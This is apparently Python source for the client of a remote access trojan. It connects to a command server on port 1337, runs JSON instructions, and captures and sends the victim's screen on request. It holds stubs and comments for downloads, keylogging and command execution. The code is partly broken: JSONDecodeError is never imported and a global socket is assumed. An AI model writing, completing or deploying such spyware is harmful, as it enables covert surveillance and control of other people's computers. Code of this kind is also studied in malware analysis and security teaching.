import socket
import threading
import json
import io
from PIL import ImageGrab

SERVER_ADDRESS = "127.0.0.1"
SERVER_PORT = 1337


def screenshot() -> None:
    """Called upon a screenshot instruction, captures an image of screen and sends to server"""
    # instantiate an empty bytes object
    img = io.BytesIO()
    # capture an image of the screen and store the data in the bytes object
    ImageGrab.grab().save(img, format="PNG")
    # send the size of the image in bytes to the server
    send(sock, str(img.tell()).encode("utf-8"))
    # send the image to the server
    send(sock, img.getvalue())


def handle(data: dict) -> None:
    """Handles instructions sent from the server

    Args:
        data (dict): Instruction information
    """
    cmd, args = data.get("cmd"), data.get("args")
    if cmd == "screenshot":
        screenshot()  # take and sent a screenshot of the client machine to the server sending the request
    elif cmd == "download":
        pass  # self._download(data.get("args")[0])
    elif cmd == "keylogs":
        pass  # self._keylogs()
    elif cmd == "execute":
        pass  # self._execute(data.get("args"))
    elif cmd == "ping":
        send(sock, json.dumps({"response": "pong"}).encode("utf-8"))


def send(sock: socket.socket, data: bytes) -> None:
    """Sends data to the server

    Args:
        sock (socket.socket): The socket to send data to
        data (dict): The data to send
    """
    sock.sendall(data)
    print(data)


def connect(sock: socket.socket, host: str, port: int) -> None:
    """Connects to a server

    Args:
        host (str): The host to connect to
        port (int): The port to connect to

    """
    try:
        sock.connect((host, port))
    except OSError:
        return
    while True:
        if not (data := sock.recv(1024)):
            break
        try:
            decoded = json.loads(data.decode("utf-8"))
        except JSONDecodeError:
            continue
        else:
            handle(decoded)


if __name__ == "__main__":
    # start keylogger thread
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        connect(sock, SERVER_ADDRESS, SERVER_PORT)
